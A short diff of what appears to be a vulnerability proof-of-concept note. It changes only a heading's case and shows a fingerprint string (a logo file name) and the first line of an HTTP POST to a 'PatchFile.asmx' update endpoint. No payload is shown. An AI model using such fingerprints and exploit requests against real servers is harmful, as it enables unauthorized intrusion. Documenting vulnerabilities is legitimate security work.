@@ -8,7 +8,7 @@
 body="logo-u9.png"
 ```
 
-## poc
+## POC
 
 ```
 POST /CS/Office/AutoUpdates/PatchFile.asmx HTTP/1.1
